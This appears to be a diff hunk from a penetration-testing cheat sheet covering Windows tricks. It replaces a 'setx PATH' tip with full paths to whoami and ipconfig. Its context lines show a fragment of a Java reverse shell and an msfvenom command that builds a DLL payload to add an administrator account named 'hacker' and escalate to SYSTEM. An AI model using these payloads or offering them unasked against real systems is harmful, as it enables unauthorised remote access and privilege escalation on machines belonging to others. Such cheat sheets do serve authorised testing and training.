@@ -394,8 +394,10 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 #### Windws Tricks
 	
-##### Setting PATH on Windows
-> 1. ```setx PATH "C:\windows\system32"```
+##### PATH issues on Windows
+> 1. ```c:\windows\system32\whoami.exe```
+> 1. ```c:\windows\system32\ipconfig.exe```
+	
 ##### Windows add user 'hacker' with 'admin' privs and become 'nt authority\system' 
 > 1. msfvenom -p windows/adduser USER='hacker' PASS='Hacker123$' -f dll > version.dll
 or
